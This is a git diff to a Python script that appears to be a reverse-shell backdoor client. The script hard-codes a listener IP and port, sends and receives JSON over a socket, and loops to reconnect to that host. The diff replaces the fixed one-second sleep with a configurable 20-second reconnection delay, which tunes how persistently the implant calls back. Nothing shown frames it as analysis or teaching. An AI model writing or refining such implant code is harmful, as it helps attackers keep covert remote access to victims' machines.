@@ -12,6 +12,7 @@ import os  # For interacting with the operating system
 
 target_ip = '192.168.203.142'
 target_port = 5555
+reconnection_delay = 20
 
 # Function to send data in a reliable way (encoded as JSON)
 def reliable_send(data):
@@ -33,7 +34,7 @@ def reliable_recv():
 # Function to establish a connection to a remote host
 def connection():
     while True:
-        time.sleep(1)  # Wait for 1 seconds before reconnecting (for resilience)
+        time.sleep(reconnection_delay)  # Wait before reconnecting (for resilience)
         try:
             # Connect to a remote host 
             s.connect((target_ip, target_port))
